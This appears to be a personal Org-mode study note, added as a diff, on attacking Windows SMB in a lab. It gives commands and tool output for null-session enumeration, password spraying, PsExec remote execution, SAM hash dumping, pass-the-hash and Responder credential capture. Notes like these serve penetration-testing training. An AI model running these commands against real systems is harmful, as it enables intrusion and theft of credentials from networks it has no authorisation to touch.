@@ -1,0 +1,218 @@
+:PROPERTIES:
+:ID:       dfe75f04-c009-4320-a645-e2d8df5a846c
+:END:
+#+title: SMB
+#+OPTIONS: toc:3 ^:{}
+
+* TOC :toc_3:
+- [[#attacking-smb][Attacking SMB]]
+  - [[#enumeration][Enumeration]]
+  - [[#misconfigurations][Misconfigurations]]
+    - [[#anon-auth][Anon Auth]]
+    - [[#file-share][File Share]]
+    - [[#rpc][RPC]]
+    - [[#enum4linux][Enum4linux]]
+  - [[#protocol-specific-attacks][Protocol specific attacks]]
+    - [[#brute-forcing--passw-spray][Brute forcing & passw spray]]
+    - [[#remote-code-execution-rce][Remote Code Execution (RCE)]]
+    - [[#enumerating-logged-on-users][Enumerating Logged-on Users]]
+    - [[#extract-hashes-from-sam-db][Extract Hashes from SAM DB]]
+    - [[#pth][PtH]]
+    - [[#forced-authentication-attacks][Forced Authentication Attacks]]
+
+* Attacking SMB
+- =TCP/139=, =UDP/137=, =UDP/138= on top of NetBIOS
+- =TCP/445= after Windows 2000
+
+** Enumeration
+- nmap
+
+** Misconfigurations
+- *null session* can be config'd
+  
+*** Anon Auth
+- get list of shares, usernames, groups, perms, policies, srv etc
+- =smbclient=, =smbmap=, =rpcclient=, =enum4linux= allow null connectivity
+
+*** File Share
+- ~smbclient -N -L //<ip>~ -> =-N=: Null session, =-L= list shares
+- ~smbmap -H <ip> -r <dir>~ -> =-r= / =-R= = browse dir / recurse
+  - ~--download~ / ~--upload~
+
+*** RPC
+- use =rpcclient= w null session to enum workstation or DC
+- [[https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf][cheat sheer from SANS inst]]
+#+begin_src bash
+biscuitrescue@htb[/htb]$ rpcclient -U'%' 10.10.110.17
+
+rpcclient $> enumdomusers
+
+user:[mhope] rid:[0x641]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+#+end_src
+
+*** Enum4linux
+- utilises =nmblookup=, =net=, =rpcclient= , =smbclient=
+- automates common enum from SMB:
+  - Workgroup/domain name
+  - users info
+  - OS info
+  - groups info
+  - shares folders
+  - passw policy info
+- ~./enum4linux-ng.py 10.10.11.45 -A -C~
+
+** Protocol specific attacks
+
+*** Brute forcing & passw spray
+- better to use *brute force* when we know threshold before which acc locks out
+- better to use *passw spraying* (target ISt of usernames for one common password)
+- usually 2-3 attempts w 1 attempt per 30-60 mins is safe
+
+**** CrackMapExec
+- can target multiple IPs, using multiple users, passes
+- ~crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth~
+- exits on finding successful login
+- use ~--continue-on-success~
+- if targetting non-domain joined comp, ~--local-auth~
+  
+*** Remote Code Execution (RCE)
+**** PsExec
+- lets us exec proc on other systems w full interactivity for console apps w/out having to install client software manually.
+- has windows service img inside its executable
+- takes srv & deploys to admin$ share on remote machine
+- then uses *DCE/RPC* over SMB to access =Windows Service Control Manager API=
+- starts PSExec srv on remote machine -> creates named pipe to send commands on system
+#+begin_src bash
+impacket-psexec administrator:'Password123!'@10.10.110.17
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.110.17.....
+[*] Found writable share ADMIN$
+[*] Uploading file EHtJXgng.exe
+[*] Opening SVCManager on 10.10.110.17.....
+[*] Creating service nbAc on 10.10.110.17.....
+[*] Starting service nbAc.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+
+C:\Windows\system32>whoami && hostname
+
+nt authority\system
+WIN7BOX
+#+end_src
+- same options for =smbexec= & =atexec=
+  
+**** CrackMapExec
+- ~crackmapexec smb <ip> -u admin -p <pass> -x <cmd> --exec-method smbexec~
+- default =exec-method=: *atexec*
+
+*** Enumerating Logged-on Users
+- ~crackmapexec smb <ip> -u administrator -p <pass> --loggedon-users~
+
+*** Extract Hashes from SAM DB
+- ~crackmapexec smb <ip> -u administrator -p <pass> --sam~
+
+*** PtH
+- ~crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE~
+
+*** Forced Authentication Attacks
+- can abuse SMB by creating fake SMB Server to capture users' *NetNTLM v1/v2 hashes*
+- tool -> =Responder= -> *LLMNR* (Link-Local Multicast Name Resolution), *NBT-NS* (NetBIOS Name Service), *MDNS* (multicast DNS) poisoner tool
+- can setup fake services (including SMB) to steal NetNTLM v1/v2 hashes
+- in default config -> finds NBT-NS traffic
+- respond on behalf of servers the victim is looking for & capture NetNTLM hashes
+
+**** Creating fake SMB server
+~responder -I <interface name>~
+- when user/system tries to perform *Name Resolution*, following procedures conducted by win machine to retrieve host IP addr by hostname
+  1. hostname file share IP addr req
+  2. local host file (=C:\Windows\system32\drivers\etc\hosts=) checked for suitable records
+  3. if (!records) { switch to local DNS cache }
+  4. if (!DNS_records) { query sent to DNS server }
+  5. else { machine issues multicast query requesting IP addr of file share from other machines on netw }
+
+#+begin_quote
+Suppose a user mistyped a shared folder's name \\mysharefoder\ instead of \\mysharedfolder\. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.
+#+end_quote
+
+#+begin_src bash
+biscuitrescue@htb[/htb]$ sudo responder -I ens33
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+               
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:                
+    LLMNR                      [ON]
+    NBT-NS                     [ON]        
+    DNS/MDNS                   [ON]   
+                                                                                                                                                                                          
+[+] Servers:         
+    HTTP server                [ON]                                   
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]                                  
+    Auth proxy                 [OFF]
+    SMB server                 [ON]                                   
+    Kerberos server            [ON]                                   
+    SQL server                 [ON]                                   
+    FTP server                 [ON]                                   
+    IMAP server                [ON]                                   
+    POP3 server                [ON]                                   
+    SMTP server                [ON]                                   
+    DNS server                 [ON]                                   
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]                                   
+                                                                                   
+[+] HTTP Options:                                                                  
+    Always serving EXE         [OFF]                                               
+    Serving EXE                [OFF]                                               
+    Serving HTML               [OFF]                                               
+    Upstream Proxy             [OFF]                                               
+
+[+] Poisoning Options:                                                             
+    Analyze Mode               [OFF]                                               
+    Force WPAD auth            [OFF]                                               
+    Force Basic Auth           [OFF]                                               
+    Force LM downgrade         [OFF]                                               
+    Fingerprint hosts          [OFF]                                               
+
+[+] Generic Options:                                                               
+    Responder NIC              [tun0]                                              
+    Responder IP               [10.10.14.198]                                      
+    Challenge set              [random]                                            
+    Don't Respond To Names     ['ISATAP']                                          
+
+[+] Current Session Variables:                                                     
+    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
+    Responder Domain Name      [HF2L.LOCAL]                                        
+    Responder DCE-RPC Port     [48162] 
+
+[+] Listening for events... 
+
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51
+#+end_src
+
+- =Responder= gives *NTLMv2* type hashes -> hashcat mode 5600
